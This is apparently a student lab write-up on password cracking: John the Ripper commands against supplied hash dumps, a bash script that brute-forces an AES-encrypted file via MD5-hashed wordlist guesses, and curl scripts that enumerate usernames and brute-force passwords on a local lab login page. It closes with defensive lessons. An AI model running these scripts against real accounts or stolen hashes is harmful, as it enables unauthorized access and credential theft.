
## Part A-  BASIC PASSWORD CRACKING

**Skills to learn**: 

```diff
+ John the ripper cracking modes (single, wordlist and mangling rules) 
``` 

Check the files folder inside this directory. It should contain, 

  - Password hash files: easy_dump, medium_dump, hard_dump
  - wordlists folder: GawkerPasswords.txt, SonyPasswords.txt, YahooVoicePasswords.txt, passwords.txt

We will use John along with [jumbo patch](http://openwall.info/wiki/john/patches). Every file, namely, easy_dump, medium_dump, hard_dump has 5 users you need to crack

To view passwords already cracked by JTR for a password dump file, one can run the following command: 
``` ~/JohnTheRipper-unstable-jumbo/run/john --show easy_dump```

### Cracking easy_dump

The following command tells JTR to try “simple” mode, then the default wordlists containing likely passwords, and then “incremental” mode. In other words, JTR uses default modes. 

```~/JohnTheRipper-unstable-jumbo/run/john easy_dump```

```diff
- ~/JohnTheRipper-unstable-jumbo/run/john is a path to the executable 
```

### Cracking medium_dump

The wordlist mode allows JTR to use thousands of passwords and generate their hashes to compare them to the hashes inside the file
```~/JohnTheRipper-unstable-jumbo/run/john --wordlist=/home/student/wordlists/YahooVoicePasswords.txt medium_dump```

I was able to crack only one user with YahooVoicePassowrds. Therefore, I used another wordlist RockYouPasswords.txt. This wordlist is not present in this repo because of size but I believe one can use /usr/share/wordlists/rockyou.txt.gz in Linux. 

Through this command, I was able to crack rest of the users 

```~/JohnTheRipper-unstable-jumbo/run/john --wordlist=/home/student/wordlists/RockYouPasswords.txt medium_dump```

### Cracking hard_dump

This one occupied most of my time. To crack hard users, we will use wordlists with "mangling rules" provided by JTR. 

```~/JohnTheRipper-unstable-jumbo/run/john --rules --wordlist=/home/student/wordlists/YahooVoicePasswords.txt hard_dump``` 

<br> 

```~/JohnTheRipper-unstable-jumbo/run/john --rules --wordlist=/home/student/wordlists/RockYouPasswords.txt hard_dump```

However, I was only able to find 4 users with this. For the 5th user, I used ```--rules:single```. This is a hybrid of mangling rules with simple mode. It turned out that 5th user password was in a wordlist but it was flipped. 


<br> 

## Part B - OFFLINE ATTACK 

**Skills to learn**: 

```diff 
+ Bash scripting, openssl utility
+ Generating passwords from John the ripper to stdout 
```

Hacker encrypted the file: secret_file.aes256.txt
- It was encrypted using AES 256 using the openssl command line tool.
- The encrypted file is BASE64 encoded.
- The hacker thought that since passwords were insecure, they would first hash their encryption password using md5 to make it "more random" and harder to guess.
- The MD5 hash of the hacker's password was used as the password given to openssl for the AES encryption.
- The contents of the file are Lorem Ipsum in ascii text.

```bash
rm /home/student/JohnTheRipper-unstable-jumbo/run/john.rec

/home/student/JohnTheRipper-unstable-jumbo/run/john --wordlist=wordlists/YahooVoicePasswords.txt -stdout |
  while IFS= read -r password
  do
    #echo "\n ----------------------------------------"
    #echo "\n Password generated is $password"
    hash=`echo -n $password | openssl dgst -md5 | cut -d ' ' -f2`
    #echo "\n MD5 hash of the password is $hash"
    #echo "\n Output while decryption ..."
    output=`openssl enc -d -aes256 -a -k $hash -in secret_file.aes256.txt`
    if [ $? -eq 0 ]; then
        echo $output | grep -P -n "[\x80-\xFF]"
        if [ $? -eq 0 ]; then
            continue
        else
            echo "\n found 1 $password"
            exit 0;
        fi
    fi
  done
echo "NOT FOUND :("
```

This is my exploit. Let's break it down to understand it. 

```rm /home/student/JohnTheRipper-unstable-jumbo/run/john.rec``` -> This is done to prevent the error "Crash recovery file is locked". 

```/home/student/JohnTheRipper-unstable-jumbo/run/john --wordlist=wordlists/YahooVoicePasswords.txt -stdout |``` -> Generate passwords from wordlist using John and output them on stdout. Later, pipe them so our while loop can read them line by line. 

```    hash=`echo -n $password | openssl dgst -md5 | cut -d ' ' -f2` ``` -> Generate md5 hash and just take the hash value from output i.e remove extra text "(stdin)="

```    output=`openssl enc -d -aes256 -a -k $hash -in secret_file.aes256.txt` ``` -> Try to decrypt using openssl. 

```bash    
if [ $? -eq 0 ]; then 
  echo $output | grep -P -n "[\x80-\xFF]"
        if [ $? -eq 0 ]; then
            continue
        else
            echo "\n found 1 $password"
            exit 0;

``` 

-> $? refers to the exit status of the last command executed. If the command was successful, then it is 0 otherwise 1

```  echo $output | grep -P -n "[\x80-\xFF]" ``` -> Exit status of this command is 0 if non ASCII character were found

<br> 

## Part C - ONLINE ATTACK 

**Skills to learn**: 

```diff
+ curl command line tool
+ bash scripting
+ password cracking
```

Our goal is to get past the login page of the website below. We would need to find active usernames and crack password for one of the accounts. 

![Screenshot](files/website/website.png?raw=true)

### Cracking active usernames 

I tried a random username and I get a following alert:

![Screenshot](files/website/website-uname-not-found.png?raw=true)

I run the following script to find active usernames: 

```bash
cat facebook-firstnames.txt | head -n100000 |
  while IFS= read -r uname
  do
    #echo $uname
    output=`curl --data "username=$uname&password=123" localhost:5000/login 2>/dev/null | grep "Error. Username does not exist."`
    if [ $? -eq 0 ]; then
        continue
    else
        echo "$uname" >> "valid_usernames.txt"
        echo $uname
    fi
  done
```

This script works by making a POST request to the server and if the response contains **"Error. Username does not exist."**, we can skip that username and look for other candidates

### Cracking password for an active user

I tried to login with an active user "adam" with a random password. This is what I got: 

![Screenshot](files/website/website-invalid-pass.png?raw=true)

Again, we can modify our existing exploit to search for "Invalid password." string here.

```bash
wordlist="500-worst-passwords.txt"

cat valid_usernames.txt |
  while IFS= read -r uname
  do
    echo "\n Current user $uname"
    cat $wordlist |
    while IFS= read -r passwd
    do
    #echo "\n Trying for $uname $passwd"
    output=`curl --data "username=$uname&password=$passwd" localhost:5000/login 2>/dev/null | grep "Invalid password."`
    if [ $? -eq 0 ]; then
        continue
    else
        echo "$uname + $passwd" >> "valid_passwords2.txt"
        echo "$uname + $passwd"
        break
    fi
    done
  done
```

```diff
- Here, I am not using wordlists from partA. I am using 500-worst-passwords.txt I found on a random Github repo. 
- This is because, users on social media sites are most likely to use bad passwords than linux users.
```

I found the password "123456789" for a user named "michael". We're in ;) 

![Screenshot](files/website/website-login-success.png?raw=true)

### SECURITY LESSON:

From this website and exploit, we can safely deduce two lessons 

- One should display same message for wrong usernames and passwords. Otherwise, it is easy for one to enumerate users. One username can be enough to find a security weaklink.
- Websites should have login rate limiting to prevent brute forcing  


